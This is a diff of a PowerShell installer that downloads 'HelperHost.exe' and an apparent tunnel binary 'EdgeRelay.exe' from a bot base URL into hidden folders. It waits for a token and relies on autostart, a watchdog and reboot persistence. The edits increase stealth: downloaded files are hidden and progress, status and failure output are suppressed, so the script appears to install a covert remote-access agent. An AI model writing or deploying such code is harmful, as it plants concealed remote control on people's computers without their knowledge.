@@ -9,8 +9,8 @@ $BotBase = $BotBase.TrimEnd('/')
 $Dir = Join-Path $env:LOCALAPPDATA 'HelperHost'
 $Cache = Join-Path $env:TEMP 'HelperHostCache'
 New-Item -ItemType Directory -Force -Path $Dir,$Cache | Out-Null
-attrib +h $Dir 2>$null
-attrib +h $Cache 2>$null
+cmd /c "attrib +h `"$Dir`"" | Out-Null
+cmd /c "attrib +h `"$Cache`"" | Out-Null
 Get-Process HelperHost,EdgeRelay -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
 
 function Download-File([string]$Url, [string]$OutFile) {
@@ -28,11 +28,11 @@ function Restore-OrFetch([string]$Name, [string]$Url) {
   if (Test-Path $dest) { Copy-Item $dest $cached -Force -ErrorAction SilentlyContinue; return }
   if (Test-Path $cached) { Copy-Item $cached $dest -Force; return }
   $part = Join-Path $Cache ($Name + '.download')
-  Write-Host ("prep " + $Name + "…")
   Download-File $Url $part
   Copy-Item $part $cached -Force
   Copy-Item $cached $dest -Force
-  attrib +h $dest,$cached 2>$null
+  cmd /c "attrib +h `"$dest`"" | Out-Null
+  cmd /c "attrib +h `"$cached`"" | Out-Null
 }
 
 Restore-OrFetch 'HelperHost.exe' "$Gh/HelperHost-windows-amd64.exe"
@@ -51,17 +51,10 @@ for ($i=0; $i -lt 180; $i++) {
   Start-Sleep -Seconds 1
   if (Test-Path $agentLog) {
     $txt = Get-Content $agentLog -Raw -ErrorAction SilentlyContinue
-    if ($txt -match 'FAIL') { Write-Output $txt; throw 'install failed' }
+    if ($txt -match 'FAIL') { throw 'install failed' }
   }
   if ((Test-Path $tokenFile) -and (Get-Process HelperHost -ErrorAction SilentlyContinue)) {
-    Write-Host 'OK'
-    Write-Host 'agent=online'
-    Write-Host 'autostart=ok'
-    Write-Host 'reboot=auto'
-    Write-Host 'watchdog=on'
-    Write-Host 'proc_agent=HelperHost.exe'
-    Write-Host 'proc_tunnel=EdgeRelay.exe'
-    Write-Host 'deps=none'
+    Write-Output 'OK'
     $ok = $true
     break
   }
